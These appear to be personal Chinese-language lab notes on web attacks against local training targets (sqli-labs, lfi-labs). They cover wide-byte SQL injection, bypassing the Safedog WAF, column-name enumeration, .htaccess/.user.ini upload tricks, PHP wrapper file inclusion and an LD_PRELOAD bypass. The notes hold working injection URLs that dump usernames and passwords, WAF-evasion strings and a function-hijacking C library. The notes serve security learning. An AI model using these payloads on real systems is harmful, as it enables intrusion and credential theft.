<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607153300026.png" alt="image-20230607153300026" style="zoom: 33%;" />

## 宽字节注入

### 前置知识

#### 输入实体化

为了保证网站的安全性，通常会对用户的输入来做安全过滤，并将敏感字符进行实体化。

实体化：在`' " \ NULL`这些字符串前面加`\`

```php
<?php
$id = "1' and 1=1#";
$payload = addslashes($id);
$sql = "select * from users where id = '{$payload}'";
var_dump($sql);

# 输出
string(45) "select * from users where id = '1\' and 1=1#'"
```

数据库执行

```sql
# 可以发现：由于实体化，使用反斜杆进行转移，使得单引号变成了字符串，没有起效。导致SQL攻击失效
mysql> select * from users where id = '1\' and 1=2#';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set, 1 warning (0.00 sec)
```

### 注入原理

==首先要保证目标的数据库使用的是GBK编码==

将payload改为：`1%df' and 1=1#`，

```php
<?php
$id = "1%df' and 1=1#";
$id = addslashes($id);
$sql = "select * from users where id = '{$id}'";
var_dump($sql);

# 输出：
string(48) "select * from users where id = '1%df\' and 1=1#'"
```

此时，由于GBK的编码方式，会将`%df\`组成一个新字符，这个字符是一个汉字，导致`\`失效，`'`恢复功能：`1ߜ' and 1=1#`

### 注入流程-Less-32

#### 寻找回显位

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,2,3%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201323254.png" alt="image-20230607201323254" style="zoom:33%;" />

#### 爆库

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(schema_name),3 from information_schema.schemata%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201634066.png" alt="image-20230607201634066" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201838412.png" alt="image-20230607201838412" style="zoom:33%;" />

#### 爆库

注意：`table_name='users'`这里的两个单引号无法逃逸，使用宽字节注入会造成语法错误，所以这里直接使用16进制

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607203144060.png" alt="image-20230607203144060" style="zoom:33%;" />

#### 拖库

```
# 查询所有用户名
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(username),3 from users%23 
# 查询所有密码
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(password),3 from users%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607203307391.png" alt="image-20230607203307391" style="zoom:33%;" />

## SQL注入-过狗

### 常见的WAF绕过语句

#### 注释

```
/*xxx*/：在SQL里，多行解释是 /* */
/*!xxx*/:MySQL扩展了解释的功能，如果后面加了!，那么注释符号将被执行
/*!50001xxxx*/：这里的50001表示如果数据库版本是：5.00.01以上版本，该语句才会被执行
# 最新版安全狗万能注释符绕过
/*//--**/
/*/!--**/
/*/-*!!*/
```

#### 替换

##### and、or替换

```
1、&&和||
2、使用异或或截断：?id=1^1^0		?id=1^0^0
3、使用{``operation}：and{`test` 1=2}		and{`test` 1=2}
4、直接使用真、假：&& true		&& false
```

##### order by替换

```
group by
```

##### union select

```
union all select
```

##### information_schema.tales

```
sys.schema_table_statistics_with_buffer
sys.schema_auto_increment_columns
```

### 安全狗4.0.266-SQL注入过程

这里一开始使用教程给的注释符号无法绕过，开始做模糊测试

#### 模糊测试-注释符

==在做模糊测试之前需要先将安全狗的CC攻击检测关闭==

思路是往`/**/`里面填东西

![image-20230608172018747](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172018747.png)

![image-20230608172030624](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172030624.png)

可以发现有许多符号可以绕过安全狗

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172756462.png" alt="image-20230608172756462" style="zoom:50%;" />

给出几个可成功绕过的符号

```
/*//--**/ 
/*//---**/
/*//--/*/
/*//--/*/
```

#### order by查询

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=1' order /*//--/*/ by 3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173502813.png" alt="image-20230608173502813" style="zoom:50%;" />

#### UNION 查询

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,2,3%23v
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173625895.png" alt="image-20230608173625895" style="zoom:50%;" />

#### 查看当前数据库

这里可以看到被安全狗防御了，问题就出在`dataase()`身上

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,database(),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173708699.png" alt="image-20230608173708699" style="zoom:33%;" />

将注释符往database()里面放进去，成功绕过！

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,database(/*//--/*/),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173834474.png" alt="image-20230608173834474" style="zoom:50%;" />

#### 爆库

在做爆库的过程中，发现`from`后面不能再加东西

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from abc%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174030426.png" alt="image-20230608174030426" style="zoom:50%;" />

尝试加上注释符，成功绕过！

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from /*//--/*/abc%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174126231.png" alt="image-20230608174126231" style="zoom:50%;" />

再次发现安全狗对`information_schema`了防御

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174319537.png" alt="image-20230608174319537" style="zoom:50%;" />

尝试往`information_schema`中间加入注释符，成功绕过

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from /*//--/*/information_/*//--/*/schema%23
```



<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174403861.png" alt="image-20230608174403861" style="zoom:50%;" />

这里在网上看到这条payload，大概意思应该是这样

```sql
# 使用 /*!*/ 使得 # 的注释功能生效，注释掉后面的abc字符串，再使用换行来逃过 # 的注释，1 为要查询的信息，最后使用*/来闭合注释
mysql> select /*!#abc
    -> 1*/;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.00 sec)

/*!--+/*%0ainformation_schema.schemata*/ 完整解释
/*!--+  使得 --+ 注释功能生效
/*xxx*/ 混淆WAF
%0a		回车逃过 --+ 的注释
*/		最后使用 */ 来闭合前面的 /*
```



```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(schema_name)from/*!--+/*%0ainformation_schema.schemata*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180406635.png" alt="image-20230608180406635" style="zoom:50%;" />

#### 爆表

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables where table_schema=database()*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180519244.png" alt="image-20230608180519244" style="zoom:50%;" />

#### 爆字段

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns where table_schema=database() and table_name='users'*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180612648.png" alt="image-20230608180612648" style="zoom:50%;" />

#### 拖库

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(username,':',password)from/*!--+/*%0ausers*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180726467.png" alt="image-20230608180726467" style="zoom:50%;" />

### 安全狗4.0.266-无列名注入

安全狗对于输入有非常严格的过滤，一旦输入的字符串中包含了`information_schema`就会被拦截，所以这里学习一个`join 无列名报错注入`，==适用于无法使用`information_schema`但是知道数据表名的情况==

#### 注入原理

通过使用一张表做两次内联查询的方式来使得列名冲突的方式来使得数据库报错，并爆出冲突的列名

```sql
mysql> select * from (select * from users as a join users as b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from (select * from users as a join users as b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'username'
mysql> select * from (select * from users as a join users as b using(id, username))c;
ERROR 1060 (42S21): Duplicate column name 'password'
mysql> select * from (select * from users as a join users as b using(id, username, password))c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)
```

#### 注入流程

##### 爆字段

这里发现`union`和`from`后面都不能加东西，所以尝试加入注释符号绕过，成功得到第一个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b)c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195202683.png" alt="image-20230608195202683" style="zoom:50%;" />

使用 using 来排除字段，得到第二个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id))c --+
```

![image-20230608195241484](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195241484.png)

同样方法，得到第三个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id, username))c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195324303.png" alt="image-20230608195324303" style="zoom:50%;" />

回显正常，没有报错信息，列名爆破完成

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id, username, password))c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195432015.png" alt="image-20230608195432015" style="zoom:50%;" />

##### 拖库

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select 1,2,group_concat(username,':',password) from /*/!--**/ users --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195615749.png" alt="image-20230608195615749" style="zoom:50%;" />

# 文件上传

## `.htaccess`文件介绍

`htaccess`文件是Apache服务器中的一个配置文件，他复制相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

其中`.htaccess`文件内容

`SetHandler application/x-httpd-php`

==设置当前目录所有文件都使用`PHP`解析==，那么无论上传任何文件，只要文件内容符合`PHP`语言代码规范，就会被当作`PHP文件执行`。不符合则报错

### `.httpd.conf`

要使得`.htaccess`文件生效，则必须对`Apache`配置文件做以下配置

```bash
<Directory />
    AllowOverride all			# 启动 .htaccess 文件并允许用户对该文件进行修改（默认为none）
    Require all denied			# 禁止用户访问Apache运行目录
</Directory>
```

## `.user.ini`

在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。

这个文件是php.ini的补充文件，==当访问PHP网页的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项==
其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。

此文件与`.htaccess`文件类似，能指定具体的文件当作PHP文件来执行，但是一定要记住：==只作用于当前目录下==

```
auto_prepend_file 表示加载第一个PHP代码之前执行指示（包含的）PHP文件
auto_append_file 表示加载第一个PHP代码之后执行指示（包含的）PHP文件
简单来说
 
auto_prepend_file = <filename>         //包含在文件头
auto_append_file = <filename>          //包含在文件尾
例如：auto_append_file、auto_prepend_file
指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。
```

## `.htaccess`和`.user.ini`文件总结

### 作用范围

`.htaccess`文件用于指定**当前目录**下的某个文件或全部文件当作PHP文件来执行，属于`Apache`的文件

`.user.ini`文件用于指定**当前目录**下的某个文件当作PHP文件来执行

### 激活

`.htaccess`文件在正确上传之后，Apache在加载某个文件之前会自动读取，只要保证`getshell`文件于`.htaccess`在同一目录就行

`.user.ini`文件在正确上传`getshell`文件之后必须先访问**同一目录**下的`PHP`文件，原因：`PHP`解释器在执行的时候会先检查当前目录是否存在`.user.ini`文件，存在则加载进配置文件`php.ini`，并执行配置文件的内容；后续使用蚁剑连接的URL则使用当前访问的PHP文件的URL来连接





## `$_Files` 变量

`$_Files`变量记录了文件的相信信息，包括文件类型，文件名，上传路径等

```bash
array(5) {
  ["name"]=>
  string(14) "金砖2023.txt"
  ["type"]=>
  string(10) "text/plain"
  ["tmp_name"]=>
  string(22) "C:\Windows\php80F6.tmp"
  ["error"]=>
  int(0)
  ["size"]=>
  int(247)
}
```

值得一提的是：`type`对应的是HTML中的`Content-Type`字段。大多数时候，后台程序员都是根据`type`的类型来判断文件类型是否合法。但是可以通过使用BP来修改`Content-Type`字段，以达到绕过的目的

现在将`.htaccess`文件上传，并将文件类型修改为图片文件。最后文件上传到服务器的文件名依然是：`.htaccrss`

==即：修改`Content-Type`不会影响文件的类型==

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230706134229696.png" alt="image-20230706134229696" style="zoom:50%;" />







# 文件包含

## 文件包含漏洞理论

### 文件包含漏洞产生原因

由于程序员的代码不规范或为了保证代码的灵活性，错误使用PHP文件包含函数，如：`include | require`函数，包含了一个**用户可控变量**，从而造成了文件包含漏洞

### 触发文件包含的PHP函数

```
Include：
Include_once：
require
require_once
highlight_file、show_source、readfile、file_get_contents、fopen、file
```

include 和 require 函数的区别：

`include` 和 `require` 都可以用来在 PHP 文件中插入另一个 PHP 文件的内容。它们的区别在于，当文件不存在时，`include` 会产生一个警告，但脚本会继续执行；而 `require` 会产生一个致命错误，并停止脚本执行

`include_once`和`require_once`若遇到重复包含的代码块，都只会包含一次

**补充：**`include`函数还可以包含图片文件或者其他文件，只要里面带有着`PHP`代码就会被执行

#### 文件包含漏洞分类

+ 本地文件包含

+ 远程文件包含

  ```
  allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读远程文件
  Allow_url_include：为ON时，就可使用include和require等方式包含远程文件
  ```

#### 文件包含漏洞利用方式

##### `PHP`伪协议

![image-20230707161448462](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707161448462.png)



```
php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用
data:// 同样类似与php://input，可以让用户来控制输入流
php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行
phar://xxx.png/shell.php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。
```

### 文件包含漏洞防御

+ PHP 中使用 open_basedir 配置限制访问在指定的区域
+ 过滤.（点）/（反斜杠）\（反斜杠）
+  禁止服务器远程文件包含
+ 尽量不要使用动态包含，可以在需要包含的页面固定写好

## 文件包绕过方式

### `%00`截断

此方法要求`PHP`版本必须小于`5.3.4`，后面版本已修复

#### 源码

```php
<?php
include($_GET['library'].".php");
?>
```

#### 原理

在路径最后加入`%00`，传入`PHP`之后变成下面这样，相当于在最后添加了一个空格，让`PHP`读不到后面拼接出来的字符串

```php
<?php
include("flag.txt .php");
?>
```

补充，有时也可以使用`./`

### 路径长度绕过

## windows系统

### 1.路径长度绕过

==Windows使用256个`.`或`./`来绕过。Linux需要4096个==

**wj.php**

```javascript
<?php
$a=@$_GET['123'];
include($a.'.html');
?>
```

复制

如果限制了文件类型，比如这里只能包含html后缀的文件，那么就可以使用此方法

#### 简介

操作系统存在最大路径长度的限制。`windows系统，文件名最长256个字符`，可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名被中途截断

在文件后面加`.` 如： `info.php...........................................................................................................................................................................................................................................................................................html`

`.`超过256个就行，后面多出来的`...........................................html`不会被识别到

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1200.png)



## `PHP`伪协议

跟着这张图照着打就好

![image-20230707161448462](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707161448462.png)

`file://`：后面跟绝对路径，用于直接**读取文件**

`php://filter`：以`base64`的方式**读取文件**

`php://input`：接受POST数据，可以使用POST方法来**写入恶意代码并执行**

`zip://`：需要先上传一个带有`PHP`代码的`PHP`压缩文件（压缩文件不检验后缀名，只要是一个压缩文件就可以），然后通过访问这个压缩包里面指定的`PHP`文件以达到**执行PHP代码**的目的

### `php://filter`

直接使用`php://filter`来读取flag

```
payload：?file=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20230707221254364](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221254364.png)

![image-20230707221324095](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221324095.png)

### `php://input`

使用`php://input`配合POST方法做数据提交

![image-20230707221623621](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221623621.png)

### `zip://`

说明：

1. `zip`访问的压缩文件不校验后缀名，只要是压缩文件就行
2. `zip`必须使用**绝对路径**来访问压缩文件
3. `zip`在路径后面使用`%23具体文件名`来访问指定文件



先上传一个压缩文件

![image-20230707224105309](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707224105309.png)

使用`zip`伪协议进行访问

![image-20230707224406577](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707224406577.png)

```
payload：?file=zip://E:\phpstudy\phpstudy\phpstudy_pro\WWW\lfi-labs-master\php\uploads\9dce5388f44ed37f145b3737f360f7c0.zip%23phpinfo.php
```

### `data://`

这个协议与`file`协议差不多，只不过比`file`更多的花样而已，具体可以看图

```
payload：?file=data://text/plain,<?php+phpinfo();?> 
```

![image-20230707225819389](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707225819389.png)



# PHP命令执行

## 0x01. 实验环境搭建

#### docker搭建

```bash
# 搜索镜像
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker search mcc0624  
NAME                 DESCRIPTION      STARS     OFFICIAL   AUTOMATED
mcc0624/ser          用户php反序列化漏洞学习    2                    
mcc0624/cmd                           0                    
mcc0624/flask_ssti                    0                    
mcc0624/ssrf         目前还未完成，请各位不要下载   0                    
mcc0624/ssrf_mysql                    0                    
mcc0624/php_apache                    0  

# 下载镜像
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker pull mcc0624/cmd

# 启动环境
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085:85 -i -t mcc0624/cmd:latest bash -c '/etc/rc.local; /bin/bash'
```

## 0x02. 命令执行函数介绍

### `system()`函数

执行指定命令并返回结果，默认有回显

#### 格式：

```
system(string $command, [int $return_var = ?])
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
<?php
$cmd = 'dir';
$res = system($cmd);

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of  :\PHP\PHP命令执行

2023/06/09  17:17    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:17    <DIR>          .idea
2023/06/09  17:17                58 system函数.php
               1 File(s)             58 bytes
               3 Dir(s)  177,981,693,952 bytes free

Process finished with exit code 0
```

### `exec()`函数

执行指定命令，将输出保存到一个指定的数组。**默认只输出最后一行结果，默认有回显**

#### 格式：

```php
exec(command, [str $output], [rint $eturn_var]);
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `output`：用于存储命令的输出的数组。命令的每一行输出将作为数组的一个元素。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
# 默认只输出最后一个结果
<?php
$comm = 'dir';

$res = exec($comm);
echo $res;

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
               3 Dir(s)  177,981,693,952 bytes free
Process finished with exit code 0
```

```php
# 将返回的所有结果都存储到 $output arr()
<?php
$comm = 'dir';

$res = exec($comm, $output);
print_r($output);

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
Array
(
    [0] =>  Volume in drive D is 新加卷
    [1] =>  Volume Serial Number is 40FB-5D65
    [2] => 
    [3] =>  Directory of D:\PHP\PHP命令执行
    [4] => 
    [5] => 2023/06/09  17:26    <DIR>          .
    [6] => 2023/06/09  17:15    <DIR>          ..
    [7] => 2023/06/09  17:25    <DIR>          .idea
    [8] => 2023/06/09  17:26                72 system函数.php
    [9] =>                1 File(s)             72 bytes
    [10] =>                3 Dir(s)  177,981,693,952 bytes free
)
```

### `passthru()`函数

功能与`system()`类似，默认有回显

#### 格式：

```
passthru(command, return_var);
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
<?php
$comm = 'dir';
passthru($comm);

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:32    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:28    <DIR>          .idea
2023/06/09  17:32                39 system函数.php
               1 File(s)             39 bytes
               3 Dir(s)  177,981,693,952 bytes free
```

### `shell_exec()`函数

功能与`system()`类似，默认**无回显**

#### 格式：

```
shell_exec(command);
```

`command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。

#### 演示：

```php
<?php
$comm = 'dir';
echo shell_exec($comm);

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:41    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:28    <DIR>          .idea
2023/06/09  17:41                46 system函数.php
               1 File(s)             46 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### PHP反引号

反引号内的代码会直接被PHP当作系统命令来执行，**默认无回显**

#### 格式：

```
$output = `command`;
```

#### 演示：

```php
<?php
echo `dir`;

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:43    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:42    <DIR>          .idea
2023/06/09  17:43                34 system函数.php
               1 File(s)             34 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### `popopen()`函数

在 PHP 中，`popen()` 函数用于执行一个外部命令，并返回一个指向该命令输出流的文件指针。通过该文件指针，您可以读取外部命令的输出。默认无回显

#### 格式：

```php
$handle = popen('command', 'mode');
```

#### 演示：

```php
<?php
$comm = 'dir';
$res = popen($comm, 'r');
echo fread($res, 4096);

--------------------
while ($s = fgets($output)){
    echo $s;
}

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:50    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:50    <DIR>          .idea
2023/06/09  17:50                73 system函数.php
               1 File(s)             73 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### `proc_open()`函数

在 PHP 中，`proc_open()` 函数用于执行一个外部命令，并提供更高级的控制和灵活性，与 `popen()` 函数相比，`proc_open()` 函数提供了更多选项来管理进程的输入、输出和错误流。默认**无回显**

#### 格式：

```
resource proc_open(string $command, array $descriptorspec, array &$pipes, string|null $cwd = null, array|null $env = null, array|null $other_options = null)
```

- `command`：要执行的外部命令。

- ```
  descriptorspec
  ```

  ：一个包含输入、输出和错误流的规范数组。规范数组的格式如下：

  - `0`：标准输入流（输入到命令的数据）。
  - `1`：标准输出流（命令的输出结果）。
  - `2`：标准错误流（命令的错误输出）。
  - 其他索引：可以自定义的文件描述符。
  - 每个索引的值可以是：
    - `["pipe", "r"]`：创建一个可写入的管道。
    - `["pipe", "w"]`：创建一个可读取的管道。
    - `["file", "path/to/file", "mode"]`：以指定的文件路径和模式打开一个文件。

- `pipes`：一个保存命令输入、输出和错误流的文件指针的数组。

- `cwd`：设置命令的当前工作目录（可选）。

- `env`：设置命令执行时的环境变量（可选）。

- `other_options`：其他选项（可选）。

#### 演示：

```php
<?php
$comm = 'dir'; // 要执行的命令，这里是使用dir命令列出当前目录的内容
$arr = array(
    array("pipe", "r"), // 标准输入流，这里使用管道打开可写入的输入流
    array("pipe", "w"), // 标准输出流，这里使用管道打开可读取的输出流
    array("file", "error-output.txt", "a") // 标准错误流，这里将错误输出重定向到文件中
);

$fp = proc_open($comm, $arr, $pipes); // 执行命令并打开进程
echo stream_get_contents($pipes[1]); // 读取标准输出流的内容并输出到屏幕上
proc_close($fp); // 关闭进程

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行
 
2023/06/09  17:59    <DIR>          .
2023/06/09  17:15    <DIR>           ..
2023/06/09  17:50    <DIR>          .idea 
2023/06/09  17:59                 0 error-output.txt
2023/06/09  17:59               231 system函数.php
               2 File(s)            231 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

## 0x03. `LD_PRELOAD`绕过原理介绍

### 攻击原理

在某些程序的运行过程中，会调用`LD_PRELOAD`，此时我们可以通过注入一个恶意的`LD_PRELOAD`库文件，使得程序在执行的过程中顺带执行了恶意程序，达到攻击的目的

举个例子：比如在`PHP`中的`echo`是一个打印函数，如果我们重构这个`echo()`函数，在里面调用`system()、shell()`等危险函数，那么用户在调用`echo()`函数时就会顺带执行了恶意代码

### 程序的链接

+ 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开

+ 装入时动态链接：源程序编译侯所得到的一组目标模块，再装入内存时，边装入边链接

+ 运行时动态链接模块：源程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接

  对于动态链接来说，需要一个动态链接库，期作用在与当动态库中的函数发生变化对于可执行程序来说是透明的，可执行程序无需重新编译，方便程序的发布/维护/更新

### `LD_PRELOAD`

**修改库文件**

它可以影响程序的运行时的链接（Runtime linker），它运行你定义在程序原型前**优先加载的动态库链接**

这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数

通过这个环境变量，我们可以在主程序和其他动态链接库的中间**加载别的动态链接库**，甚至覆盖正常的函数库

使用自己的或是更好的函数（无需别人的源码）

*_也可以想别人的程序注入恶意程序_*

### 攻击流程

**以`mail()`函数举例**

#### 1. 正常执行文件

源文件

```php
<?php
mail('','','','');   
```

#### 2. 追踪文件的执行

`strace`工具用来检测`demo.php`在执行的过程中还做了哪些系统调用

```php
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# strace -o 1.txt -f php demo.php
```

#### 3. 追踪可执行子进程

这里追踪到了一个`sendmail`子进程，

```shell
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# grep "exec" 1.txt                 
76377 execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x5647b3b4fa38 /* 32 vars */ <unfinished ...>
76377 <... execve resumed>)             = 0

```

#### 4. 继续追踪子进程，寻找可利用函数

这里可以发现调用了函数`geteuid()`

```sh
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# readelf -Ws /usr/sbin/sendmail
99: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND geteuid@GLIBC_2.2.5 (3)
```

#### 5. 编写脚本，重构`geteuid()`

使用C语言编写库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

void payload(){
    system("echo 'Hacker~~'");
}


int geteuid(){
    unsetenv("LD_PRELOAD");		// 结束调用，防止死循环
    payload();
}
```

`gcc`编译文件

```bash
gcc -shared -fPIC demo.c -o poc.so
```

修改PHP文件

```php
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# cat demo.php 
<?php 
// 在程序运行之前先加载 LD_PRELOAD 的共享库
